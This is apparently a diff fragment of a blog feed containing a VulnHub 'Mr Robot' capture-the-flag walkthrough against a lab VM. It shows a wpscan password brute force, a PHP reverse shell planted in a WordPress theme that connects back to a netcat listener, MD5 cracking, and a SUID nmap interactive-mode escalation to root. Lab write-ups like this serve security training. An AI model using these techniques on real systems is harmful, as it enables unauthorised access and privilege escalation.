+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/mrRobot# cat fsociety.dic <span class="p">|</span> sort -u <span class="p">|</span> awk <span class="p">&amp;</span>lsquo<span class="p">;</span>length<span class="o">(</span><span class="nv">$1</span><span class="o">)</span> <span class="p">&amp;</span>lt<span class="p">;</span><span class="o">=</span> <span class="m">16</span> <span class="p">&amp;</span>amp<span class="p">;&amp;</span>amp<span class="p">;</span> length<span class="o">(</span><span class="nv">$1</span><span class="o">)</span> &gt;<span class="o">=</span> <span class="m">6</span> <span class="o">{</span> print <span class="nv">$1</span> <span class="o">}</span><span class="p">&amp;</span>rsquo<span class="p">;</span> &gt; pass.txt
+</span><span class='line'>root@kali:~/mrRobot# wpscan <span class="p">&amp;</span>ndash<span class="p">;</span>url 10.1.1.137 <span class="p">&amp;</span>ndash<span class="p">;</span>wordlist ~/mrRobot/pass.txt <span class="p">&amp;</span>ndash<span class="p">;</span>username elliot&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;hr /&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;pre&gt;&lt;code&gt;    __          _______   _____
+</span><span class='line'>    <span class="se">\ \ </span>       / /  __ <span class="se">\ </span>/ ____<span class="p">|</span>
+</span><span class='line'>     <span class="se">\ \ </span> /<span class="se">\ </span> / /<span class="p">|</span> <span class="p">|</span>__<span class="o">)</span> <span class="p">|</span> <span class="o">(</span>___   ___  __ _ _ __
+</span><span class='line'>      <span class="se">\ \/</span>  <span class="se">\/</span> / <span class="p">|</span>  ___/ <span class="se">\_</span>__ <span class="se">\ </span>/ __<span class="p">|</span>/ _<span class="sb">`</span> <span class="p">|</span> <span class="err">&#39;</span>_ <span class="se">\ </span>
+</span><span class='line'>       <span class="se">\ </span> /<span class="se">\ </span> /  <span class="p">|</span> <span class="p">|</span>     ____<span class="o">)</span> <span class="p">|</span> <span class="o">(</span>__<span class="p">|</span> <span class="o">(</span>_<span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span>
+</span><span class='line'>        <span class="se">\/</span>  <span class="se">\/</span>   <span class="p">|</span>_<span class="p">|</span>    <span class="p">|</span>_____/ <span class="se">\_</span>__<span class="p">|</span><span class="se">\_</span>_,_<span class="p">|</span>_<span class="p">|</span> <span class="p">|</span>_<span class="p">|</span>
+</span><span class='line'>
+</span><span class='line'>    WordPress Security Scanner by the WPScan Team
+</span><span class='line'>                   Version 2.8
+</span><span class='line'>      Sponsored by Sucuri - https://sucuri.net
+</span><span class='line'>&lt;/code&gt;&lt;/pre&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;   @&lt;em&gt;WPScan&lt;/em&gt;, @ethicalhack3r, @erwan_lr, pvdl, @&lt;em&gt;FireFart&lt;/em&gt;&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;hr /&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;<span class="o">[</span>+<span class="o">]</span> URL: &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://10.1.1.137/&quot;</span>&gt;http://10.1.1.137/&lt;/a&gt;
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Started: Mon Aug  <span class="m">8</span> 03:09:23 2016&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;<span class="o">[</span>+<span class="o">]</span> robots.txt available under: <span class="p">&amp;</span>lsquo<span class="p">;</span>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://10.1.1.137/robots.txt&quot;</span>&gt;http://10.1.1.137/robots.txt&lt;/a&gt;<span class="p">&amp;</span>rsquo<span class="p">;</span>&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;<span class="p">&amp;</span>hellip<span class="p">;</span>truncated<span class="p">&amp;</span>hellip<span class="p">;</span>&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;  <span class="o">[</span>+<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> Login : elliot Password : ER28-0652&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;  +<span class="p">&amp;</span>mdash<span class="p">;</span>-+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>ndash<span class="p">;</span>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>ndash<span class="p">;</span>+
+</span><span class='line'>  <span class="p">|</span> Id <span class="p">|</span> Login  <span class="p">|</span> Name <span class="p">|</span> Password  <span class="p">|</span>
+</span><span class='line'>  +<span class="p">&amp;</span>mdash<span class="p">;</span>-+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>ndash<span class="p">;</span>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>ndash<span class="p">;</span>+
+</span><span class='line'>  <span class="p">|</span>    <span class="p">|</span> elliot <span class="p">|</span>      <span class="p">|</span> ER28-0652 <span class="p">|</span>
+</span><span class='line'>  +<span class="p">&amp;</span>mdash<span class="p">;</span>-+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>ndash<span class="p">;</span>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>ndash<span class="p">;</span>+&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;<span class="o">[</span>+<span class="o">]</span> Finished: Mon Aug  <span class="m">8</span> 03:11:37 2016
+</span></code></pre></td></tr></table></div></figure></p>
+
+<p>Found the password is <font color="red"><code>ER28-0652</code></font></p>
+
+<p>However, there is another way to find out the WordPress login username and password, rather than brute force.</p>
+
+<p>From the result of nikto scan, I noticed there is another file found <code>/license.txt</code>. By checking the source code of the file on <code>http://10.1.1.137/license.txt</code></p>
+
+<p>I found:</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;pre&gt;
+</span><span class='line'>what you <span class="k">do</span> just pull code from Rapid9 or some s@#% since when did you become a script kitty?
+</span><span class='line'>
+</span><span class='line'>...truncated...
+</span><span class='line'>
+</span><span class='line'><span class="k">do</span> you want a password or something?
+</span><span class='line'>
+</span><span class='line'>...truncated...
+</span><span class='line'>
+</span><span class='line'><span class="nv">ZWxsaW90OkVSMjgtMDY1Mgo</span><span class="o">=</span>
+</span><span class='line'>&lt;/pre&gt;
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;
+</span></code></pre></td></tr></table></div></figure></p>
+
+<p>By decoding the Base64 encoded string: <code>ZWxsaW90OkVSMjgtMDY1Mgo=</code>, I got a username / password <font color="red"><code>elliot:ER28-0652</code></font></p>
+
+<p>and from nikto scan, I also noticed that the admin login page is <code>http://10.1.1.137/wp-login.php</code>.</p>
+
+<p>So, try to login with the found username / password and succeed!.</p>
+
+<p>Now heading to <code>Appearance</code> &ndash;> <code>Editor</code> &ndash;> <code>404.php</code> (notice here the theme is <code>twentyfifteen</code>) and replaced the content with <a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell" title="PHP Reverse Shell by pentestmonkey">pentestmonkey&rsquo;s php reverse shell</a> (configured to connect back on port 443).</p>
+
+<p>Then setup <code>NC</code> to listen on port <code>443</code>.</p>
+
+<p>Now, by accessing the page <code>http://10.1.1.137/wp-content/themes/twentyfifteen/404.php</code> to trigger the reverse shell connect back to my attacking machine.</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# nc -lvnp 443
+</span><span class='line'>listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">443</span> <span class="p">&amp;</span>hellip<span class="p">;</span>
+</span><span class='line'>connect to <span class="o">[</span>10.1.1.130<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.1.1.137<span class="o">]</span> 47762
+</span><span class='line'>Linux linux 3.13.0-55-generic <span class="c">#94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux</span>
+</span><span class='line'> 09:01:50 up <span class="m">15</span> min,  <span class="m">0</span> users,  load average: 0.00, 0.02, 0.05
+</span><span class='line'>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1<span class="o">(</span>daemon<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1<span class="o">(</span>daemon<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1<span class="o">(</span>daemon<span class="o">)</span>
+</span><span class='line'>/bin/sh: 0: can<span class="p">&amp;</span>rsquo<span class="p">;</span>t access tty<span class="p">;</span> job control turned off
+</span><span class='line'><span class="nv">$ </span>id
+</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1<span class="o">(</span>daemon<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1<span class="o">(</span>daemon<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1<span class="o">(</span>daemon<span class="o">)</span>
+</span><span class='line'><span class="nv">$ </span><span class="nb">pwd</span>
+</span><span class='line'>/
+</span><span class='line'><span class="nv">$ </span>ls -al
+</span><span class='line'>total 84
+</span><span class='line'>drwxr-xr-x  <span class="m">22</span> root root  <span class="m">4096</span> Sep <span class="m">16</span>  <span class="m">2015</span> .
+</span><span class='line'>drwxr-xr-x  <span class="m">22</span> root root  <span class="m">4096</span> Sep <span class="m">16</span>  <span class="m">2015</span> ..
+</span><span class='line'>drwxr-xr-x   <span class="m">2</span> root root  <span class="m">4096</span> Sep <span class="m">16</span>  <span class="m">2015</span> bin
+</span><span class='line'>drwxr-xr-x   <span class="m">3</span> root root  <span class="m">4096</span> Nov <span class="m">13</span>  <span class="m">2015</span> boot
+</span><span class='line'>drwxr-xr-x  <span class="m">13</span> root root  <span class="m">3960</span> Aug  <span class="m">7</span>  <span class="m">2016</span> dev
+</span><span class='line'>drwxr-xr-x  <span class="m">77</span> root root  <span class="m">4096</span> Aug  <span class="m">7</span>  <span class="m">2016</span> etc
+</span><span class='line'>drwxr-xr-x   <span class="m">3</span> root root  <span class="m">4096</span> Nov <span class="m">13</span>  <span class="m">2015</span> home
+</span><span class='line'>lrwxrwxrwx   <span class="m">1</span> root root    <span class="m">33</span> Jun <span class="m">24</span>  <span class="m">2015</span> initrd.img -&gt; boot/initrd.img-3.13.0-55-generic
+</span><span class='line'>drwxr-xr-x  <span class="m">16</span> root root  <span class="m">4096</span> Jun <span class="m">24</span>  <span class="m">2015</span> lib
+</span><span class='line'>drwxr-xr-x   <span class="m">2</span> root root  <span class="m">4096</span> Jun <span class="m">24</span>  <span class="m">2015</span> lib64
+</span><span class='line'>drwx<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>   <span class="m">2</span> root root <span class="m">16384</span> Jun <span class="m">24</span>  <span class="m">2015</span> lost+found
+</span><span class='line'>drwxr-xr-x   <span class="m">2</span> root root  <span class="m">4096</span> Jun <span class="m">24</span>  <span class="m">2015</span> media
+</span><span class='line'>drwxr-xr-x   <span class="m">4</span> root root  <span class="m">4096</span> Nov <span class="m">13</span>  <span class="m">2015</span> mnt
+</span><span class='line'>drwxr-xr-x   <span class="m">3</span> root root  <span class="m">4096</span> Sep <span class="m">16</span>  <span class="m">2015</span> opt
+</span><span class='line'>dr-xr-xr-x <span class="m">339</span> root root     <span class="m">0</span> Aug  <span class="m">7</span>  <span class="m">2016</span> proc
+</span><span class='line'>drwx<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>   <span class="m">3</span> root root  <span class="m">4096</span> Nov <span class="m">13</span>  <span class="m">2015</span> root
+</span><span class='line'>drwxr-xr-x  <span class="m">14</span> root root   <span class="m">500</span> Aug  <span class="m">7</span> 08:47 run
+</span><span class='line'>drwxr-xr-x   <span class="m">2</span> root root  <span class="m">4096</span> Nov <span class="m">13</span>  <span class="m">2015</span> sbin
+</span><span class='line'>drwxr-xr-x   <span class="m">3</span> root root  <span class="m">4096</span> Jun <span class="m">24</span>  <span class="m">2015</span> srv
+</span><span class='line'>dr-xr-xr-x  <span class="m">13</span> root root     <span class="m">0</span> Aug  <span class="m">7</span>  <span class="m">2016</span> sys
+</span><span class='line'>drwxrwxrwt   <span class="m">5</span> root root  <span class="m">4096</span> Aug  <span class="m">7</span> 08:49 tmp
+</span><span class='line'>drwxr-xr-x  <span class="m">10</span> root root  <span class="m">4096</span> Jun <span class="m">24</span>  <span class="m">2015</span> usr
+</span><span class='line'>drwxr-xr-x  <span class="m">11</span> root root  <span class="m">4096</span> Jun <span class="m">24</span>  <span class="m">2015</span> var
+</span><span class='line'>lrwxrwxrwx   <span class="m">1</span> root root    <span class="m">30</span> Jun <span class="m">24</span>  <span class="m">2015</span> vmlinuz -&gt; boot/vmlinuz-3.13.0-55-generic
+</span><span class='line'><span class="err">$</span>
+</span></code></pre></td></tr></table></div></figure></p>
+
+<p>Then use python to get a better shell.</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>python -c <span class="p">&amp;</span>lsquo<span class="p">;</span>import pty<span class="p">;</span> pty.spawn<span class="o">(</span><span class="p">&amp;</span>ldquo<span class="p">;</span>/bin/bash<span class="p">&amp;</span>rdquo<span class="p">;</span><span class="o">)</span><span class="p">;&amp;</span>rsquo<span class="p">;</span>
+</span><span class='line'>daemon@linux:/home/robot<span class="nv">$ </span><span class="nb">pwd</span>
+</span><span class='line'><span class="nb">pwd</span>
+</span><span class='line'>/home/robot
+</span><span class='line'>daemon@linux:/home/robot<span class="nv">$ </span>ls -al
+</span><span class='line'>ls -al
+</span><span class='line'>total 16
+</span><span class='line'>drwxr-xr-x <span class="m">2</span> root  root  <span class="m">4096</span> Nov <span class="m">13</span>  <span class="m">2015</span> .
+</span><span class='line'>drwxr-xr-x <span class="m">3</span> root  root  <span class="m">4096</span> Nov <span class="m">13</span>  <span class="m">2015</span> ..
+</span><span class='line'>-r<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>ndash<span class="p">;</span> <span class="m">1</span> robot robot   <span class="m">33</span> Nov <span class="m">13</span>  <span class="m">2015</span> key-2-of-3.txt
+</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span> <span class="m">1</span> robot robot   <span class="m">39</span> Nov <span class="m">13</span>  <span class="m">2015</span> password.raw-md5
+</span><span class='line'>daemon@linux:/home/robot<span class="err">$</span>
+</span><span class='line'>daemon@linux:/home/robot<span class="nv">$ </span>cat password.raw-md5
+</span><span class='line'>cat password.raw-md5
+</span><span class='line'>robot:c3fcd3d76192e4007dfb496cca67e13b
+</span><span class='line'>daemon@linux:/home/robot<span class="nv">$ </span>cat /etc/passwd <span class="p">|</span> grep robot
+</span><span class='line'>cat /etc/passwd <span class="p">|</span> grep robot
+</span><span class='line'>robot:x:1002:1002::/home/robot:
+</span></code></pre></td></tr></table></div></figure></p>
+
+<p>Found the 2nd key file <code>key-2-of-3.txt</code>, but it only can be read by user <code>robot</code></p>
+
+<p>However, I found the username <code>robot</code> and the MD5 hash value of his password <code>c3fcd3d76192e4007dfb496cca67e13b</code> in the file <code>/home/robot/password.raw-md5</code></p>
+
+<p>By cracking the MD5 hash, I got <code>robot</code>&rsquo;s password is <font color="red"><code>abcdefghijklmnopqrstuvwxyz</code></font></p>
+
+<p>Also, by checking the <code>/etc/passwd</code> file, I noticed that <code>robot</code> is a system user.</p>
+
+<p>Now I can <code>su</code> to user <code>robot</code>.</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>daemon@linux:/home/robot<span class="nv">$ </span>su robot
+</span><span class='line'>su robot
+</span><span class='line'>Password: abcdefghijklmnopqrstuvwxyz&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;robot@linux:~<span class="nv">$ </span>id
+</span><span class='line'>id
+</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1002<span class="o">(</span>robot<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>robot<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1002<span class="o">(</span>robot<span class="o">)</span>
+</span></code></pre></td></tr></table></div></figure></p>
+
+<p>Now, I can read the 2nd key:</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>robot@linux:~<span class="nv">$ </span>cat key-2-of-3.txt
+</span><span class='line'>cat key-2-of-3.txt
+</span><span class='line'>822c73956184f694993bede3eb39f959
+</span></code></pre></td></tr></table></div></figure></p>
+
+<p>The 2nd key is <font color="red"><code>822c73956184f694993bede3eb39f959</code></font></p>
+
+<p>Now move on to enumeration and rooting, I found there is an <a href="https://www.exploit-db.com/papers/18168/" title="NMAP --interactive priviledge escalation">old version of NMAP vulnerability</a> which can be exploited to get ROOT:</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>robot@linux:/tmp<span class="nv">$ </span>/usr/local/bin/nmap -v
+</span><span class='line'>/usr/local/bin/nmap -v&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;Starting nmap 3.81 <span class="o">(</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://www.insecure.org/nmap/&quot;</span>&gt;http://www.insecure.org/nmap/&lt;/a&gt; <span class="o">)</span> at 2016-08-07 12:40 UTC
+</span><span class='line'>No target machines/networks specified!
+</span><span class='line'>QUITTING!
+</span><span class='line'>robot@linux:/tmp<span class="nv">$ </span>ls -la /usr/local/bin/nmap
+</span><span class='line'>ls -la /usr/local/bin/nmap
+</span><span class='line'>-rwsr-xr-x <span class="m">1</span> root root <span class="m">504736</span> Nov <span class="m">13</span>  <span class="m">2015</span> /usr/local/bin/nmap
+</span><span class='line'>robot@linux:/tmp<span class="nv">$ </span>/usr/local/bin/nmap <span class="p">&amp;</span>ndash<span class="p">;</span>interactive
+</span><span class='line'>/usr/local/bin/nmap <span class="p">&amp;</span>ndash<span class="p">;</span>interactive&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;Starting nmap V. 3.81 <span class="o">(</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://www.insecure.org/nmap/&quot;</span>&gt;http://www.insecure.org/nmap/&lt;/a&gt; <span class="o">)</span>
+</span><span class='line'>Welcome to Interactive Mode <span class="p">&amp;</span>ndash<span class="p">;</span> press h &lt;enter&gt; <span class="k">for</span> <span class="nb">help</span>
+</span><span class='line'>nmap&gt; !sh
+</span><span class='line'>!sh&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;h1&gt;id&lt;/h1&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;id
+</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1002<span class="o">(</span>robot<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>robot<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,1002<span class="o">(</span>robot<span class="o">)</span>&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;h1&gt;pwd&lt;/h1&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;pwd
+</span><span class='line'>/tmp&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;h1&gt;cd /root&lt;/h1&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;cd /root&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;h1&gt;pwd&lt;/h1&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;pwd
+</span><span class='line'>/root&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;h1&gt;ls -al&lt;/h1&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;ls -al
+</span><span class='line'>total 32
+</span><span class='line'>drwx<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>  <span class="m">3</span> root root <span class="m">4096</span> Nov <span class="m">13</span>  <span class="m">2015</span> .
+</span><span class='line'>drwxr-xr-x <span class="m">22</span> root root <span class="m">4096</span> Sep <span class="m">16</span>  <span class="m">2015</span> ..
+</span><span class='line'>-rw<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>-  <span class="m">1</span> root root <span class="m">4058</span> Nov <span class="m">14</span>  <span class="m">2015</span> .bash_history
+</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span>  <span class="m">1</span> root root <span class="m">3274</span> Sep <span class="m">16</span>  <span class="m">2015</span> .bashrc
+</span><span class='line'>drwx<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>  <span class="m">2</span> root root <span class="m">4096</span> Nov <span class="m">13</span>  <span class="m">2015</span> .cache
+</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span>  <span class="m">1</span> root root    <span class="m">0</span> Nov <span class="m">13</span>  <span class="m">2015</span> firstboot_done
+</span><span class='line'>-r<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>ndash<span class="p">;</span>  <span class="m">1</span> root root   <span class="m">33</span> Nov <span class="m">13</span>  <span class="m">2015</span> key-3-of-3.txt
+</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span>  <span class="m">1</span> root root  <span class="m">140</span> Feb <span class="m">20</span>  <span class="m">2014</span> .profile
+</span><span class='line'>-rw<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>-  <span class="m">1</span> root root <span class="m">1024</span> Sep <span class="m">16</span>  <span class="m">2015</span> .rnd&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;h1&gt;cat key-3-of-3.txt&lt;/h1&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;cat key-3-of-3.txt
+</span><span class='line'>04787ddef27c3dee1ee161b21670b4e4&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;h1&gt;&lt;/h1&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;
+</span></code></pre></td></tr></table></div></figure></p>
+
+<p>Now we got ROOT and the 3rd key is <font color="red"><code>04787ddef27c3dee1ee161b21670b4e4</code></font></p>
+
+<!--- Reference -->
+
+
+
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[[VulnHub] SecTalks: BNE0x03 - Simple]]></title>
@@ -1751,7 +2592,7 @@
 <span class='line-number'>49</span>
 <span class='line-number'>50</span>
 <span class='line-number'>51</span>
-</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/Kevgir# ssh -p <span class="m">1322</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;&amp;#109;&amp;#x61;&amp;#x69;&amp;#108;&amp;#x74;&amp;#111;&amp;#x3a;&amp;#x61;&amp;#x64;&amp;#x6d;&amp;#x69;&amp;#x6e;&amp;#x40;&amp;#x31;&amp;#48;&amp;#46;&amp;#49;&amp;#x2e;&amp;#x31;&amp;#x2e;&amp;#49;&amp;#50;&amp;#56;&quot;</span>&gt;<span class="p">&amp;</span><span class="c">#97;&amp;#x64;&amp;#109;&amp;#105;&amp;#x6e;&amp;#64;&amp;#49;&amp;#x30;&amp;#46;&amp;#x31;&amp;#46;&amp;#49;&amp;#46;&amp;#x31;&amp;#50;&amp;#56;&lt;/a&gt;</span>
